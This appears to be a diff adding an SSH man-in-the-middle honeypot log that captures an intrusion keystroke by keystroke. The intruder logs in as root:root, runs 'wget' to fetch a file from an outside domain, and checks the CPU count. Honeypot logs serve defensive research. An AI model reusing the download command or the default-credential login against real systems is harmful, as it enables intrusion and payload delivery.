@@ -1,0 +1,84 @@
+2019-11-28 14:56:20.314 - [Info] MITM Version: 1.26
+2019-11-28 14:56:20.320 - [Info] Auto Access Enabled: true
+2019-11-28 14:56:20.320 - [Debug] [Init] Auto Access Barrier: true
+2019-11-28 14:56:20.342 - [Info] SSH man-in-the-middle server for 172.20.0.6 listening on 0.0.0.0:10105
+2019-11-28 15:13:47.778 - [Debug] [Connection] Attacker connected: 86.125.56.158 | Client Identification: SSH-2.0-MoTTY_Release_0.71
+2019-11-28 15:13:49.687 - [Debug] [Auth] Attacker 86.125.56.158 trying to authenticate with "none"
+2019-11-28 15:13:49.688 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-28 15:13:50.798 - [Debug] [Auth] Attacker 86.125.56.158 trying to authenticate with "password"
+2019-11-28 15:13:50.800 - [Debug] [Auto Access] Attacker: 86.125.56.158, Threshold: 1, Attempts: 1
+2019-11-28 15:13:50.800 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-28 15:13:50.800 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2019-11-28 15:13:50.944 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-28 15:13:50.944 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.6
+2019-11-28 15:13:50.994 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-28 15:13:51.555 - [Debug] [Connection] Attacker connected: 86.125.56.158 | Client Identification: SSH-2.0-SecureBlackbox
+2019-11-28 15:13:52.671 - [Debug] [SHELL] Opened shell for attacker
+2019-11-28 15:13:52.848 - [Debug] [Auth] Attacker 86.125.56.158 trying to authenticate with "none"
+2019-11-28 15:13:52.848 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-28 15:13:53.126 - [Debug] [Auth] Attacker 86.125.56.158 trying to authenticate with "password"
+2019-11-28 15:13:53.127 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-28 15:13:53.127 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.6
+2019-11-28 15:13:53.307 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-28 15:13:53.316 - [Debug] [SHELL] Attacker Keystroke: w
+2019-11-28 15:13:53.421 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-28 15:13:53.423 - [Debug] [SHELL] line from reader: w
+2019-11-28 15:13:53.423 - [Debug] [SHELL] Keystroke buffer: 119,13
+2019-11-28 15:13:54.548 - [Debug] [SHELL] Attacker Keystroke: w
+2019-11-28 15:13:54.741 - [Debug] [SHELL] Attacker Keystroke: g
+2019-11-28 15:13:54.905 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-28 15:13:55.085 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-28 15:13:55.139 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-28 15:13:55.235 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-28 15:13:55.402 - [Debug] [SHELL] Attacker Keystroke: a
+2019-11-28 15:13:55.483 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-28 15:13:55.586 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-28 15:13:55.685 - [Debug] [SHELL] Attacker Keystroke: l
+2019-11-28 15:13:55.788 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-28 15:13:55.853 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-28 15:13:55.974 - [Debug] [SHELL] Attacker Keystroke: h
+2019-11-28 15:13:56.038 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-28 15:13:56.188 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-28 15:13:56.325 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-28 15:13:56.543 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-28 15:13:56.566 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-28 15:13:56.657 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-28 15:13:56.741 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-28 15:13:56.803 - [Debug] [SHELL] Attacker Keystroke: a
+2019-11-28 15:13:56.984 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-28 15:13:56.999 - [Debug] [SHELL] Attacker Keystroke: h
+2019-11-28 15:13:57.170 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-28 15:13:57.224 - [Debug] [SHELL] Attacker Keystroke: v
+2019-11-28 15:13:57.390 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-28 15:13:57.447 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-28 15:13:57.550 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-28 15:13:57.654 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-28 15:13:57.723 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-28 15:13:57.773 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-28 15:13:57.870 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-28 15:13:57.871 - [Debug] [SHELL] line from reader: wget fanelishere.ro/arhive/info
+2019-11-28 15:13:57.871 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,102,97,110,101,108,105,115,104,101,114,101,46,114,111,47,97,114,104,105,118,101,47,105,110,102,111,13
+2019-11-28 15:14:17.651 - [Debug] [SHELL] Attacker Keystroke: [ETX]
+2019-11-28 15:14:18.004 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-28 15:14:18.336 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-28 15:14:18.450 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-28 15:14:18.608 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-28 15:14:18.685 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-28 15:14:18.756 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-28 15:14:18.757 - [Debug] [SHELL] line from reader: nproc
+2019-11-28 15:14:18.757 - [Debug] [SHELL] Keystroke buffer: 3,110,112,114,111,99,13
+2019-11-28 15:14:19.321 - [Debug] [SHELL] Attacker Keystroke: l
+2019-11-28 15:14:19.482 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-28 15:14:19.631 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-28 15:14:19.666 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-28 15:14:19.840 - [Debug] [SHELL] Attacker Keystroke: u
+2019-11-28 15:14:19.950 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-28 15:14:19.951 - [Debug] [SHELL] line from reader: lscpu
+2019-11-28 15:14:19.951 - [Debug] [SHELL] Keystroke buffer: 108,115,99,112,117,13
+2019-11-28 15:14:22.943 - [Debug] [Connection] Attacker closed connection
+2019-11-28 15:14:22.962 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-28 15:14:22.963 - [Debug] [LXC] Container's OpenSSH server closed connection
+2019-11-28 15:14:22.965 - [Debug] [SHELL] Honeypot ended shell
+2019-11-28 15:14:23.061 - [Debug] [Connection] Attacker closed connection
+2019-11-28 15:14:23.076 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-28 15:14:23.076 - [Debug] [LXC] Container's OpenSSH server closed connection
